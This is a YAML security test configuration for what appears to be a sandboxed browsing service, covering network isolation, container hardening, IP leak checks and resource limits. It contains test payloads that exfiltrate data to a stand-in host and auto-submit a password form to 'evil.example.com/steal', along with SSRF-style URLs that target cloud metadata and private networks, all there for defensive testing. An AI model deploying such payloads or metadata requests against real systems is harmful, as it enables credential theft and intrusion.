"""
Security Test Configuration
"""

# Network isolation tests
network_isolation:
  enabled: true
  allowed_networks: []
  blocked_networks:
    - "10.0.0.0/8"
    - "172.16.0.0/12" 
    - "192.168.0.0/16"
    - "169.254.169.254/32"  # Metadata service
    - "127.0.0.0/8"         # Loopback
  
  test_urls:
    private_networks:
      - "http://192.168.1.1/"
      - "http://10.0.0.1/"
      - "http://172.16.0.1/"
    metadata_services:
      - "http://169.254.169.254/latest/meta-data/"
      - "http://169.254.169.254/metadata/instance"
    localhost_variants:
      - "http://127.0.0.1:22/"
      - "http://localhost:3000/"

# Container security tests  
container_security:
  seccomp_enabled: true
  capabilities_dropped: ["ALL"]
  capabilities_added: ["NET_RAW"]  # Only for network monitoring
  read_only_filesystem: true
  no_new_privileges: true
  
  required_security_opts:
    - "seccomp=/etc/docker/seccomp-sandbox.json"
    - "no-new-privileges:true"
    - "apparmor:docker-default"

# IP leak prevention tests
ip_leak_prevention:
  test_services:
    - "https://httpbin.org/ip"
    - "https://api.ipify.org/"
    - "https://icanhazip.com/"
  
  dns_leak_tests:
    - "https://1.1.1.1/cdn-cgi/trace"
    - "https://8.8.8.8/"
  
  webrtc_tests:
    - "webrtc_local_ip_detection"
    - "webrtc_public_ip_detection"

# Resource limits
resource_limits:
  memory_limit: "512m"
  cpu_limit: "0.5"
  disk_limit: "1g"
  
  ulimits:
    nproc: 128
    nofile: 1024
    fsize: 100000000  # 100MB
  
  test_thresholds:
    memory_usage_max: 90  # 90% of limit
    cpu_usage_max: 80     # 80% of limit
    disk_usage_max: 90    # 90% of limit

# Malicious content handling
malicious_content:
  javascript_execution:
    blocked_functions:
      - "eval"
      - "Function"
      - "setTimeout"
      - "setInterval"
    
    blocked_apis:
      - "localStorage"
      - "sessionStorage"
      - "geolocation"
      - "camera"
      - "microphone"
  
  iframe_security:
    blocked_sources:
      - "javascript:"
      - "data:text/html"
      - "vbscript:"
    
    sandbox_attributes:
      - "allow-same-origin"  # Only if needed
  
  form_security:
    block_submissions: true
    sanitize_inputs: true
    remove_actions: true

# Acceptance criteria
acceptance_criteria:
  max_execution_time: 120  # seconds
  max_memory_usage: "512m"
  max_disk_usage: "1g"
  
  required_evidence:
    - "screenshots"
    - "network_captures" 
    - "dom_dumps"
    - "security_events"
  
  ip_leak_prevention: true
  metadata_access_blocked: true
  network_isolation_active: true
  
  minimum_security_score: 80
  
  test_payloads:
    safe_url: "https://httpbin.org/html"
    ip_leak_test: "https://httpbin.org/ip"
    malicious_js: |
      <html>
      <script>
        // Test payload for security validation
        localStorage.setItem('test', 'data');
        fetch('https://evil.example.com/', {method: 'POST'});
        navigator.geolocation.getCurrentPosition(console.log);
      </script>
      </html>
    
    form_test: |
      <html>
      <form action="https://evil.example.com/steal" method="POST">
        <input type="password" name="password" value="secret">
        <input type="submit" value="Submit">
      </form>
      <script>document.forms[0].submit();</script>
      </html>

# Compliance frameworks
compliance:
  frameworks:
    - "SOC2"
    - "ISO27001" 
    - "GDPR"
    - "PCI-DSS"
  
  audit_requirements:
    - "network_isolation_validated"
    - "container_security_verified"
    - "ip_leak_prevention_confirmed"
    - "evidence_integrity_maintained"
    - "resource_limits_enforced"

# Test execution settings
execution:
  parallel_tests: false  # Run sequentially for stability
  timeout_per_test: 60   # seconds
  retry_failed_tests: 1
  cleanup_after_tests: true
  
  reporting:
    generate_html_report: true
    generate_json_report: true
    include_evidence: true
    export_compliance_data: true